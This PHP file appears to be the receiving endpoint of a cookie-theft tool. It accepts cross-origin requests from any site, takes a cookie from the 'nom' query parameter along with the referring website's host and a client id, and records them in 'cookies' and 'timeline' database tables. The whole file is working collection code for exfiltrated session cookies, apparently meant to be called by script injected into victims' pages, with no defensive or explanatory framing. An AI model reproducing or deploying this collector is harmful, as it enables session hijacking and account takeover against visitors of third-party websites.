<?php
header("Access-Control-Allow-Origin: *");

require_once ('../includes/functions.php');

$cookie = $_GET["nom"]; // nom nom?

if(empty($cookie))
  die();

$jsTimestamp = substr($_GET["t"], 0, -3);

$referer = parse_url($_SERVER['HTTP_REFERER']); 

$url = $referer["host"];


$clientUniq = $_GET["uid"];

$uniq = md5($clientUniq. $url );


$db->bind("unique_id", $uniq);


$dataCheck = $db->single("SELECT id FROM cookies WHERE unique_id = :unique_id");


if (empty($dataCheck)) {

    $db->bindMore(array(
        "client_id" => $clientUniq,
        "unique_id" => $uniq,
        "website" => $url,
        "cookie" => $cookie
    ));
    
    $db->query("INSERT INTO cookies (`client_id`,  `unique_id`, `website`, `cookie`, `time`) 
        	VALUES (:client_id, :unique_id, :website, :cookie, NOW() )");



    $db->bind("unique_id", $uniq);
    $timelineCheck = $db->single("SELECT id FROM timeline WHERE unique_id = :unique_id");
    
    if (empty($timelineCheck)) {
        
        $db->bindMore(array(
            "client_id" => $clientUniq,
            "unique_id" => $uniq,
            "page_load" => $jsTimestamp,
            "website" => $url,
            "type" => "cookie"
        ));
        
        $db->query("INSERT INTO timeline ( `client_id`, `unique_id`,  `page_load`, `website`, `type`, `time`) 
            VALUES (:client_id, :unique_id, :page_load, :website, :type, NOW() )");
    }

}

?>